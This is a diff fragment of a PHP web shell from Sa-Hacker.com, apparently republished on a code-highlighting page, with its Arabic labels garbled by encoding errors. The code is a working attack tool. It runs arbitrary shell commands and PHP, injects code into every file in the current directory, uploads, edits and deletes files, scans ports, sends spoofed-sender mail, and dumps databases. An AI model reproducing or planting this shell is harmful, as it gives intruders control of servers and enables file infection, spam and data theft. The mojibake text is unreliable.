+<td valign=top><center><font face='Verdana' size='2'>(html) ÇáÑÓÇáÉ áÜ ÇáÅíãíá íÏÚã áÛÉ åÊãá</font></center>
+<center><font face='Verdana' size='1'>Çáì:<br>
+<input type='text' size='19' name='mto'><br>
+Çáì:<br>
+<input type='text' size='19' name='mfrom'><br>
+ÇáãæÖæÚ:<br>
+<input type='text' size='19' name='mobj'><br>
+ÇáãÍÊæì:<br>
+<textarea name='mtext' cols=20 rows=4></textarea><br>
+<br><input type='submit' value='ÅÑÓá' name='senm'>
+</form></table><br>";}
 if(isset($_POST['senm']))
 {
-//ÇÑÓÇá ÑÓÇáÉ   &lt;- webcheatsheet.com
+//ÇÑÓÇá ÑÓÇáÉ   <- webcheatsheet.com
 $to = $_POST['mto'];
 $subject = $_POST['mobj'];
-$contentz = $_POST['mtext']."&lt;!--";
+$contentz = $_POST['mtext']."<!--";
 $random_hash = md5(date('r', time()));
 $headers = "From: ".$_POST['mfrom']."rnReply-To: ".$_POST['mfrom'];
 $headers .= "rnContent-Type: multipart/alternative; boundary='PHP-alt-".$random_hash."'";
@@ -1197,27 +1197,27 @@ $message = ob_get_clean();
 
 $mail = @mail( $to, $subject, $message, $headers );
 
-if($mail) { echo "&lt;br&gt;&lt;td valign=top&gt;
-&lt;center&gt;&lt;font color='green' size='1'&gt;Êã ÇáÅÑÓÇá&lt;/font&gt;&lt;/center&gt;&lt;/table&gt;"; }
-else { echo "&lt;br&gt;&lt;td valign=top&gt;
-&lt;center&gt;&lt;font color='red' size='1'&gt;áã íÊã ÇáÅÑÓÇá&lt;/font&gt;&lt;/center&gt;&lt;/table&gt;"; }
+if($mail) { echo "<br><td valign=top>
+<center><font color='green' size='1'>Êã ÇáÅÑÓÇá</font></center></table>"; }
+else { echo "<br><td valign=top>
+<center><font color='red' size='1'>áã íÊã ÇáÅÑÓÇá</font></center></table>"; }
 }
 
 elseif(isset($_POST['encoder'])) {
 //ÇáÊÔÝíÑ 
-echo "&lt;form method='post' action=''&gt;&lt;td valign=top&gt;
-&lt;center&gt;&lt;font face='Verdana' size='1'&gt;: ÖÚ ÇáÈÇÓæÑÏ ÇáãÑÇÏ ÊÔÝíÑåÇ &lt;/font&gt;&lt;br&gt;&lt;textarea name='encod'&gt;&lt;/textarea&gt;&lt;br&gt;&lt;input type='submit' value='Encode' name='encode'&gt;&lt;/form&gt;&lt;/table&gt;";
+echo "<form method='post' action=''><td valign=top>
+<center><font face='Verdana' size='1'>: ÖÚ ÇáÈÇÓæÑÏ ÇáãÑÇÏ ÊÔÝíÑåÇ </font><br><textarea name='encod'></textarea><br><input type='submit' value='Encode' name='encode'></form></table>";
 }
-if(isset($_POST['encode'])) { echo "&lt;td valign=top&gt;
-&lt;center&gt;&lt;font face='Verdana' size='1'&gt;
-MD5:   &nbsp;&nbsp;&nbsp;&nbsp;&lt;input type='text' size='35' value='".md5($_POST['encod'])."'&gt;&lt;br&gt;
-Sha1:  &nbsp;&nbsp;&nbsp;&lt;input type='text' size='35' value='".sha1($_POST['encod'])."'&gt;&lt;br&gt;
-Crc32: &nbsp;&nbsp;&nbsp;&lt;input type='text' size='34' value='".crc32($_POST['encod'])."'&gt;&lt;br&gt;&lt;br&gt;
-Base64 Encode: &lt;input type='text' size='35' value='".base64_encode($_POST['encod'])."'&gt;&lt;br&gt;
-Base64 Decode: &lt;input type='text' size='36' value='".base64_decode($_POST['encod'])."'&gt;&lt;/table&gt;";}
+if(isset($_POST['encode'])) { echo "<td valign=top>
+<center><font face='Verdana' size='1'>
+MD5:   &nbsp;&nbsp;&nbsp;&nbsp;<input type='text' size='35' value='".md5($_POST['encod'])."'><br>
+Sha1:  &nbsp;&nbsp;&nbsp;<input type='text' size='35' value='".sha1($_POST['encod'])."'><br>
+Crc32: &nbsp;&nbsp;&nbsp;<input type='text' size='34' value='".crc32($_POST['encod'])."'><br><br>
+Base64 Encode: <input type='text' size='35' value='".base64_encode($_POST['encod'])."'><br>
+Base64 Decode: <input type='text' size='36' value='".base64_decode($_POST['encod'])."'></table>";}
 
 //ÊØÈíÞ ÇáÃæÇãÑ ãÈÓØ
-echo "&lt;/table&gt;";
+echo "</table>";
    if(isset($_POST['cmdex']))
    {
    switch ($_POST['functionz']) {
@@ -1225,7 +1225,7 @@ echo "&lt;/table&gt;";
     system(stripslashes($_POST['cmd']));
     break;
     case "popen":
-    $handle = popen($_POST['cmd'].' 2&gt;&1', 'r');
+    $handle = popen($_POST['cmd'].' 2>&1', 'r');
     echo "'$handle'; " . gettype($handle) . "n";
     $read = fread($handle, 2096);
     echo $read;
@@ -1245,85 +1245,85 @@ if(isset($_POST['doedit']) && $_POST['editfile'] != $dir)
 {
 $file = $_POST['editfile'];
 $content = file_get_contents($file);
-echo "&lt;br&gt;&lt;table class='menu' width=100%&gt;&lt;tr&gt;&lt;td&gt;&lt;center&gt;&lt;form action='' method='post'&gt;&lt;center&gt;
-&lt;font size=2 face='Verdana'&gt;&lt;b&gt;ÊÍÑíÑ ÇáãáÝ&lt;/b&gt;&lt;/font&gt;&lt;br&gt;&lt;input type='hidden' name='editfile' value='".$file."'&gt;&lt;font size=1 face='Verdana'&gt;&lt;font color=#FF0000&gt;ãÓÇÑ ÇáãáÝ ==&gt;&lt;/font&gt; ".stripslashes($file)."&lt;/font&gt;&lt;br&gt;
-&lt;textarea rows=20 cols=80 name='newtext'&gt;".htmlspecialchars($content)."&lt;/textarea&gt;&lt;br /&gt;&lt;input type='submit' name='edit' value='äÝÐ'&gt;&lt;/form&gt;&lt;/td&gt;&lt;/table&gt;";
+echo "<br><table class='menu' width=100%><tr><td><center><form action='' method='post'><center>
+<font size=2 face='Verdana'><b>ÊÍÑíÑ ÇáãáÝ</b></font><br><input type='hidden' name='editfile' value='".$file."'><font size=1 face='Verdana'><font color=#FF0000>ãÓÇÑ ÇáãáÝ ==></font> ".stripslashes($file)."</font><br>
+<textarea rows=20 cols=80 name='newtext'>".htmlspecialchars($content)."</textarea><br /><input type='submit' name='edit' value='äÝÐ'></form></td></table>";
 }
 if(isset($_POST['edit'])) {
 $file = $_POST['editfile'];
-$fh = fopen($file, "w+")or die("&lt;div align=center&gt;
-	&lt;table class=menu  &gt; &lt;tr&gt;&lt;td&gt;
-&lt;font color=#FF0000&gt;áÇ íãßä ÝÊÍ ÇáãáÝ&lt;/span&gt;&lt;/font&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
-&lt;/div&gt;
+$fh = fopen($file, "w+")or die("<div align=center>
+	<table class=menu  > <tr><td>
+<font color=#FF0000>áÇ íãßä ÝÊÍ ÇáãáÝ</span></font></td></tr></table>
+</div>
 ");
-fwrite($fh, stripslashes($_POST['newtext']))or die("&lt;div align=center&gt;
-	&lt;table class=menu  &gt; &lt;tr&gt;&lt;td&gt;
-&lt;center&gt;áã íÊã ÊÍÑíÑ ÇáãáÝ&lt;/center&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
-&lt;/div&gt;");
+fwrite($fh, stripslashes($_POST['newtext']))or die("<div align=center>
+	<table class=menu  > <tr><td>
+<center>áã íÊã ÊÍÑíÑ ÇáãáÝ</center></td></tr></table>
+</div>");
 fclose($fh);
-echo "&lt;div align=center&gt;
-	&lt;table class=menu  &gt; &lt;tr&gt;&lt;td&gt;
-&lt;center&gt;Êã ÊÍÑíÑ ÇáãáÝ ÈäÌÇÍ Úáì ÇáãÓÇÑ ÇáÊÇáí&lt;/center&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
-&lt;/div&gt;
-&lt;div align=center&gt;
-&lt;table class=menu  &gt; &lt;tr&gt;&lt;td&gt;
-&lt;center&gt;&lt;/font&gt; ".stripslashes($file)."&lt;/font&gt;&lt;/center&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/div&gt;
+echo "<div align=center>
+	<table class=menu  > <tr><td>
+<center>Êã ÊÍÑíÑ ÇáãáÝ ÈäÌÇÍ Úáì ÇáãÓÇÑ ÇáÊÇáí</center></td></tr></table>
+</div>
+<div align=center>
+<table class=menu  > <tr><td>
+<center></font> ".stripslashes($file)."</font></center></td></tr></table></div>
 
 ";
 }
-echo "&lt;table class=menu  &gt; &lt;tr&gt;&lt;td&gt;
-&lt;center&gt;&lt;font size='2' dir=rtl face='tahoma'&gt;:: ÃÌãÇáí ÇáãáÝÇÊ: $fileq  ($filew ãáÝ æ  $pahtw ãÌáÏ)  ::&lt;/font&gt;&lt;/center&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
-&lt;center&gt;&lt;table class=menuz width=100% cellspacing=0 cellpadding=0 border=0&gt;
-&lt;font size='1'&gt;
-&lt;td valign=top&gt;&lt;font face='tahoma' size='2'&gt;&lt;b&gt;ÃÓã ÇáãáÝ :&lt;/b&gt;&lt;/font&gt;&lt;/td&gt;&lt;td valign=top&gt;&lt;font face='tahoma' size='2'&gt;&lt;b&gt;ÇáäæÚ :&lt;/b&gt;&lt;/font&gt;&lt;/td&gt;&lt;td valign=top width=15%&gt;&lt;font face='tahoma' size=2&gt;&lt;b&gt;ÇáÍÌã :&lt;/b&gt;&lt;/font&gt;&lt;/td&gt;&lt;td valign=top width=10%&gt;&lt;font face='tahoma' size='2'&gt;&lt;b&gt;ÇáÊÕÑíÍ :&lt;/b&gt;&lt;/font&gt;&lt;/td&gt;$listf&lt;/font&gt;
-&lt;/table&gt;&lt;/center&gt;";
+echo "<table class=menu  > <tr><td>
+<center><font size='2' dir=rtl face='tahoma'>:: ÃÌãÇáí ÇáãáÝÇÊ: $fileq  ($filew ãáÝ æ  $pahtw ãÌáÏ)  ::</font></center></td></tr></table>
+<center><table class=menuz width=100% cellspacing=0 cellpadding=0 border=0>
+<font size='1'>
+<td valign=top><font face='tahoma' size='2'><b>ÃÓã ÇáãáÝ :</b></font></td><td valign=top><font face='tahoma' size='2'><b>ÇáäæÚ :</b></font></td><td valign=top width=15%><font face='tahoma' size=2><b>ÇáÍÌã :</b></font></td><td valign=top width=10%><font face='tahoma' size='2'><b>ÇáÊÕÑíÍ :</b></font></td>$listf</font>
+</table></center>";
 
 echo "
-&lt;table class='menu' dir='ltr' cellspacing='0' cellpadding='0' border='0' width='100%'&gt;&lt;tr&gt;&lt;td valign=top&gt;
-&lt;center&gt;&lt;b&gt;&lt;font size='2' face='Tahoma'&gt;:: ÅÏÑÇÌ ßæÏ Èí ÇÊÔ Èí ::&lt;br&gt;&lt;/font&gt;&lt;/b&gt;
-   &lt;form method='post' action=''&gt;
-   &lt;textarea name=php_eval cols=50 rows=4&gt;&lt;/textarea&gt;&lt;br&gt;
-   &lt;input type='submit' value='äÝÐ'&gt;
-   &lt;/form&gt;
-&lt;/td&gt;&lt;td valign=top&gt;&lt;center&gt;&lt;font face='Tahoma' size='2'&gt;&lt;b&gt;:: ÍÞä ßæÏ Ýí ÌãíÚ ãáÝÇÊ ãÓÇÑß ÇáÍÇáí ::&lt;/b&gt;&lt;/font&gt;&lt;form method='post' action=''&gt;&lt;textarea name='cod3inf' cols=50 rows=4&gt;<?php /* ÖÚ ÇáßæÏ åäÇ */ ?>&lt;/textarea&gt;&lt;br&gt;&lt;input type='submit' value='äÝÐ' name='inf3ct'&gt;&lt;br&gt;";
+<table class='menu' dir='ltr' cellspacing='0' cellpadding='0' border='0' width='100%'><tr><td valign=top>
+<center><b><font size='2' face='Tahoma'>:: ÅÏÑÇÌ ßæÏ Èí ÇÊÔ Èí ::<br></font></b>
+   <form method='post' action=''>
+   <textarea name=php_eval cols=50 rows=4></textarea><br>
+   <input type='submit' value='äÝÐ'>
+   </form>
+</td><td valign=top><center><font face='Tahoma' size='2'><b>:: ÍÞä ßæÏ Ýí ÌãíÚ ãáÝÇÊ ãÓÇÑß ÇáÍÇáí ::</b></font><form method='post' action=''><textarea name='cod3inf' cols=50 rows=4><?php /* ÖÚ ÇáßæÏ åäÇ */ ?></textarea><br><input type='submit' value='äÝÐ' name='inf3ct'><br>";
 if(isset($textzz)) { echo $textzz; }
-echo "&lt;/center&gt;&lt;/form&gt;&lt;/td&gt;&lt;/tr&gt;
-&lt;tr&gt;
-&lt;td valign=top&gt;
-&lt;center&gt;&lt;b&gt;&lt;font size='2' face='Tahoma'&gt;:: ÇáÐåÇÈ Çáì ::&lt;br&gt;&lt;/font&gt;&lt;/b&gt;
-&lt;form name='directory' method='post' action=''&gt;
-&lt;input type='text' name='dir' value='$dir' size=53&gt;
-&lt;input type='submit' value='äÝÐ'&gt;
-&lt;/form&gt;&lt;/td&gt;&lt;td&gt;&lt;center&gt;&lt;b&gt;&lt;font size='2' face='Tahoma'&gt;:: ÊÍÑíÑ ãáÝ ::&lt;br&gt;&lt;/font&gt;&lt;/b&gt;
-&lt;form method='post' action=''&gt;
-&lt;input type='text' name='editfile'  value='$dir' size=50 &gt;
-&lt;input type='submit' value='äÝÐ' name='doedit'&gt;
-&lt;/form&gt;&lt;/center&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign=top&gt;
-&lt;center&gt;&lt;b&gt;&lt;font size=2 face='Tahoma'&gt;:: ÊØÈíÞ ÇáÃæÇãÑ ::&lt;/font&gt;&lt;/b&gt;&lt;br&gt;
-        &lt;form method='post' action=''&gt;
-      &lt;input name=cmd size=35  type=text&gt;
-        &lt;select name=functionz&gt;
-          &lt;option&gt;passthru&lt;/option&gt;
-          &lt;option&gt;popen&lt;/option&gt;
-          &lt;option&gt;exec&lt;/option&gt;
-          &lt;option&gt;shell_exec&lt;/option&gt;
-          &lt;option&gt;system&lt;/option&gt;
-        &lt;/select&gt; &lt;input  type='submit'  name='cmdex'  value='äÝÐ'&gt;&lt;/form&gt;&lt;/td&gt;
-      &lt;td&gt;
-&lt;center&gt;&lt;b&gt;&lt;font size='2' face='Tahoma'&gt;:: ÝÍÕ ãäÇÝÐ ÇáÓíÑÝÑ ::&lt;br&gt;&lt;/font&gt;&lt;/b&gt;
-   &lt;form name='scanner' method='post'&gt;
-   &lt;input type='text' name='host' size=40 value='".$_SERVER['SERVER_ADDR']."' &gt;
-   &lt;select name='protocol'&gt;
-   &lt;option value='tcp'&gt;tcp&lt;/option&gt;
-   &lt;option value='udp'&gt;udp&lt;/option&gt;
-   &lt;/select&gt;
-   &lt;input type='submit' value='äÝÐ'&gt;
+echo "</center></form></td></tr>
+<tr>
+<td valign=top>
+<center><b><font size='2' face='Tahoma'>:: ÇáÐåÇÈ Çáì ::<br></font></b>
+<form name='directory' method='post' action=''>
+<input type='text' name='dir' value='$dir' size=53>
+<input type='submit' value='äÝÐ'>
+</form></td><td><center><b><font size='2' face='Tahoma'>:: ÊÍÑíÑ ãáÝ ::<br></font></b>
+<form method='post' action=''>
+<input type='text' name='editfile'  value='$dir' size=50 >
+<input type='submit' value='äÝÐ' name='doedit'>
+</form></center></td></tr><tr><td valign=top>
+<center><b><font size=2 face='Tahoma'>:: ÊØÈíÞ ÇáÃæÇãÑ ::</font></b><br>
+        <form method='post' action=''>
+      <input name=cmd size=35  type=text>
+        <select name=functionz>
+          <option>passthru</option>
+          <option>popen</option>
+          <option>exec</option>
+          <option>shell_exec</option>
+          <option>system</option>
+        </select> <input  type='submit'  name='cmdex'  value='äÝÐ'></form></td>
+      <td>
+<center><b><font size='2' face='Tahoma'>:: ÝÍÕ ãäÇÝÐ ÇáÓíÑÝÑ ::<br></font></b>
+   <form name='scanner' method='post'>
+   <input type='text' name='host' size=40 value='".$_SERVER['SERVER_ADDR']."' >
+   <select name='protocol'>
+   <option value='tcp'>tcp</option>
+   <option value='udp'>udp</option>
+   </select>
+   <input type='submit' value='äÝÐ'>
 ";
 if(isset($host) && isset($proto))
 {
-echo "&lt;br /&gt;&lt;font size='1' face='Tahoma'&gt;ÇáãäÇÝÐ ÇáãÝÊæÍå: ";
+echo "<br /><font size='1' face='Tahoma'>ÇáãäÇÝÐ ÇáãÝÊæÍå: ";
 
-for($current = 0; $current &lt;= 23; $current++)
+for($current = 0; $current <= 23; $current++)
 {
 $currents = $myports[$current];
 $service = getservbyport($currents, $proto);
@@ -1336,83 +1336,83 @@ echo "$currents, ";
 }
 }
 }
-echo "&lt;/font&gt;&lt;/form&gt;&lt;/td&gt;&lt;/tr&gt;
-&lt;tr&gt;
-&lt;td valign=top width=50%&gt;
-&lt;center&gt;&lt;b&gt;&lt;font size='2'  face='Tahoma'&gt;:: ÑÝÚ ãáÝ ::&lt;br&gt;&lt;/font&gt;&lt;/b&gt;
-   &lt;form method='post' action='' enctype='multipart/form-data'&gt;
-   &lt;input type='hidden' name='dare' value='$dir'&gt;
-   &lt;input type='file' name='ffile' size=40&gt;
-   &lt;input type='submit' name='ok' value='äÝÐ'&gt;
-   &lt;/center&gt;   
-   &lt;/form&gt;
-&lt;/td&gt;
-&lt;td valign=top&gt;
-&lt;center&gt;&lt;b&gt;&lt;font size='2' face='Tahoma'&gt;:: ÍÐÝ ãáÝ ::&lt;br&gt;&lt;/font&gt;&lt;/b&gt;
-   &lt;form method='post' action=''&gt;
-   &lt;input type='text' size=50 name='delete' value='$dir' &gt; &lt;input type='submit' value='äÝÐ' name='deletfilez'&gt;
-   &lt;/center&gt;
-   &lt;/form&gt;
-&lt;/td&gt;&lt;/tr&gt;
-&lt;tr&gt;
-&lt;td valign=top&gt;
+echo "</font></form></td></tr>
+<tr>
+<td valign=top width=50%>
+<center><b><font size='2'  face='Tahoma'>:: ÑÝÚ ãáÝ ::<br></font></b>
+   <form method='post' action='' enctype='multipart/form-data'>
+   <input type='hidden' name='dare' value='$dir'>
+   <input type='file' name='ffile' size=40>
+   <input type='submit' name='ok' value='äÝÐ'>
+   </center>   
+   </form>
+</td>
+<td valign=top>
+<center><b><font size='2' face='Tahoma'>:: ÍÐÝ ãáÝ ::<br></font></b>
+   <form method='post' action=''>
+   <input type='text' size=50 name='delete' value='$dir' > <input type='submit' value='äÝÐ' name='deletfilez'>
+   </center>
+   </form>
+</td></tr>
+<tr>
+<td valign=top>
 
-&lt;center&gt;&lt;b&gt;&lt;font size='2' face='Tahoma'&gt;:: ÅäÔÇÁ ãÌáÏ ::&lt;br&gt;&lt;/font&gt;&lt;/b&gt;
-   &lt;form method='post' action=''&gt;
-   &lt;input type='text' name='makedir' value='$dir' size=52&gt; &lt;input type='submit' value='äÝÐ'&gt;
-   &lt;/center&gt;
-   &lt;/form&gt;
-&lt;/td&gt;
-&lt;td valign=top&gt;
-&lt;center&gt;&lt;b&gt;&lt;font size='2' face='Tahoma'&gt;:: ÍÐÝ ãÌáÏ ::&lt;br&gt;&lt;/font&gt;&lt;/b&gt;
-   &lt;form method='post' action=''&gt;
-   &lt;input type='text' name='deletedir' size=50 value='$dir'&gt; &lt;input type='submit' value='äÝÐ'&gt;
-   &lt;/center&gt;
-   &lt;/form&gt;
-&lt;/td&gt;&lt;/tr&gt;
-&lt;tr&gt;
-&lt;td valign=top width=50%&gt;
-&lt;center&gt;&lt;b&gt;&lt;font size='2' face='Tahoma'&gt;:: ÅäÔÇÁ ãáÝ ::&lt;br&gt;&lt;/font&gt;&lt;/b&gt;
-   &lt;form method='post' action=''&gt;
-   &lt;input type='hidden' name='darezz' value='$dir'&gt;
-   &lt;font size='1' face='Tahoma'&gt;ÅÓã ÇáãáÝ :&lt;/font&gt;&lt;br&gt;
-   &lt;input type='text' name='names' size='30'&gt;&lt;br&gt;
-   &lt;font size='1' face='Tahoma'&gt;ãÍÊæì ÇáãáÝ :&lt;/font&gt;&lt;br&gt;
-   &lt;textarea rows='16' cols='30' name='source'&gt;&lt;/textarea&gt;&lt;br&gt;
-   &lt;input type='submit' value='äÝÐ'&gt;
-   &lt;/center&gt;
-   &lt;/form&gt;
-&lt;/td&gt;
-&lt;td valign=top width=50%&gt;
-&lt;center&gt;&lt;b&gt;&lt;font size='2' face='Tahoma'&gt;:: ÇáÅÊÕÇá ÈÇáÞÇÚÏå ::&lt;br&gt;&lt;/font&gt;&lt;/b&gt;
-   &lt;form method='post' action=''&gt;
-   &lt;font size='1' face='Tahoma'&gt;ÇáãÓÊÎÏã   --   ÇáÈÇÓæÑÏ&lt;/font&gt;&lt;br&gt;
-   &lt;input type='text' name='user' size='10'&gt;
-   &lt;input type='text' name='passd' size='10'&gt;&lt;br&gt;
-   &lt;font size='1' face='Tahoma'&gt;ÇáãÓÊÖíÝ:&lt;/font&gt;&lt;br&gt;
-   &lt;input type='text' name='host' value='localhost'&gt;&lt;br&gt;
-   &lt;font size='1' face='Tahoma'&gt;ÅÓã ÇáÞÇÚÏå:&lt;/font&gt;&lt;br&gt;
-   &lt;input type='text' name='db'&gt;&lt;br&gt;
-   &lt;font size='1' face='Tahoma'&gt;ÅÓÊÚáÇã:&lt;/font&gt;&lt;br&gt;
-   &lt;textarea rows='10' cols='30' name='query'&gt;&lt;/textarea&gt;&lt;br&gt;
-   &lt;input type='submit' value='ÅÑÓÇá ÅÓÊÚáÇã' name='godb'&gt;&lt;br&gt;&lt;input type='submit' name='dump' value='ÊÝÑíÛ ÇáÞÇÚÏå'&gt;
-   &lt;/center&gt;
-   &lt;/form&gt;
-&lt;/td&gt; &lt;/tr&gt;
+<center><b><font size='2' face='Tahoma'>:: ÅäÔÇÁ ãÌáÏ ::<br></font></b>
+   <form method='post' action=''>
+   <input type='text' name='makedir' value='$dir' size=52> <input type='submit' value='äÝÐ'>
+   </center>
+   </form>
+</td>
+<td valign=top>
+<center><b><font size='2' face='Tahoma'>:: ÍÐÝ ãÌáÏ ::<br></font></b>
+   <form method='post' action=''>
+   <input type='text' name='deletedir' size=50 value='$dir'> <input type='submit' value='äÝÐ'>
+   </center>
+   </form>
+</td></tr>
+<tr>
+<td valign=top width=50%>
+<center><b><font size='2' face='Tahoma'>:: ÅäÔÇÁ ãáÝ ::<br></font></b>
+   <form method='post' action=''>
+   <input type='hidden' name='darezz' value='$dir'>
+   <font size='1' face='Tahoma'>ÅÓã ÇáãáÝ :</font><br>
+   <input type='text' name='names' size='30'><br>
+   <font size='1' face='Tahoma'>ãÍÊæì ÇáãáÝ :</font><br>
+   <textarea rows='16' cols='30' name='source'></textarea><br>
+   <input type='submit' value='äÝÐ'>
+   </center>
+   </form>
+</td>
+<td valign=top width=50%>
+<center><b><font size='2' face='Tahoma'>:: ÇáÅÊÕÇá ÈÇáÞÇÚÏå ::<br></font></b>
+   <form method='post' action=''>
+   <font size='1' face='Tahoma'>ÇáãÓÊÎÏã   --   ÇáÈÇÓæÑÏ</font><br>
+   <input type='text' name='user' size='10'>
+   <input type='text' name='passd' size='10'><br>
+   <font size='1' face='Tahoma'>ÇáãÓÊÖíÝ:</font><br>
+   <input type='text' name='host' value='localhost'><br>
+   <font size='1' face='Tahoma'>ÅÓã ÇáÞÇÚÏå:</font><br>
+   <input type='text' name='db'><br>
+   <font size='1' face='Tahoma'>ÅÓÊÚáÇã:</font><br>
+   <textarea rows='10' cols='30' name='query'></textarea><br>
+   <input type='submit' value='ÅÑÓÇá ÅÓÊÚáÇã' name='godb'><br><input type='submit' name='dump' value='ÊÝÑíÛ ÇáÞÇÚÏå'>
+   </center>
+   </form>
+</td> </tr>
 
-&lt;/table&gt;
-&lt;/table&gt;
+</table>
+</table>
 
-&lt;table class='menu' cellspacing='0' cellpadding='0' border='0' width='100%'&gt;
-&lt;tr&gt;
-&lt;td valign=top&gt;
-&lt;center&gt;&lt;font size='1' face='Verdana'&gt;
-&lt;b&gt;&lt;font color=#FF0000&gt;::&lt;/font&gt; Powered by 
-&lt;a href=http://www.sa-hacker.com/vb/member.php?u=3624&gt;H4KOOOM&lt;/a&gt; - Hk@8.Nf -( &lt;a href=http://www.sa-hacker.com&gt;Sa-Hacker.com )&lt;/a&gt; - Vers10n ".$version." 
-&lt;font color=#FF0000&gt;::&lt;/font&gt; &lt;/b&gt;
-&lt;/center&gt;&lt;/font&gt;&lt;/td&gt;&lt;/tr&gt;
-&lt;/body&gt;
-&lt;/html&gt;";
+<table class='menu' cellspacing='0' cellpadding='0' border='0' width='100%'>
+<tr>
+<td valign=top>
+<center><font size='1' face='Verdana'>
+<b><font color=#FF0000>::</font> Powered by 
+<a href=http://www.sa-hacker.com/vb/member.php?u=3624>H4KOOOM</a> - Hk@8.Nf -( <a href=http://www.sa-hacker.com>Sa-Hacker.com )</a> - Vers10n ".$version." 
+<font color=#FF0000>::</font> </b>
+</center></font></td></tr>
+</body>
+</html>";
 
 ?>
 {% endhighlight %}
